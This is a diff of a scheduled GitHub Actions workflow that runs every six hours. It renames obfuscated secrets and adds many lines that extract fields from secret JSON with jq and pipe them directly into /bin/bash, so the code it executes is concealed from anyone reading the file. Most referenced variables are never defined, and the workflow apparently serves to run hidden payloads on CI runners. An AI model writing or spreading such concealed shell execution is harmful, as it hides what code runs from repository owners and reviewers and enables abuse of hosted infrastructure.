@@ -3,8 +3,7 @@ name: dengshiming7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
-
+    - cron: '50 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: dengshiming7654
         env:
-          iv7: ${{ secrets.iv7 }}
+          qo0174: ${{ secrets.qo0174 }}
         run: |
-          echo $iv7 | jq -r .bxf3573 | /bin/bash
-          echo $xbqqm47 | jq -r .ockc0644 | /bin/bash
-          echo $y51 | jq -r .dfku64 | /bin/bash
-          echo $esc32 | jq -r .mpzw363 | /bin/bash
-          echo $mopby1912 | jq -r .n12537 | /bin/bash
-          echo $gnssy56 | jq -r .kj29636 | /bin/bash
+          echo $qo0174 | jq -r .tfpwp18 | /bin/bash
+          echo $a00 | jq -r .gizgb97 | /bin/bash
+          echo $cazjl89869 | jq -r .zce869 | /bin/bash
+          echo $vbj623 | jq -r .jm44786 | /bin/bash
+          echo $p01895 | jq -r .ivk74 | /bin/bash
+          echo $bjj6096 | jq -r .l4409 | /bin/bash
+          echo $znr1 | jq -r .em0869 | /bin/bash
+          echo $me3 | jq -r .stz107 | /bin/bash
+          echo $efjpo79831 | jq -r .c64853 | /bin/bash
+          echo $uasy50508 | jq -r .jm6637 | /bin/bash
+          echo $vi002 | jq -r .oio228 | /bin/bash
+          echo $duq186 | jq -r .sihc67 | /bin/bash
+          echo $pqbda43672 | jq -r .xonf659 | /bin/bash
 
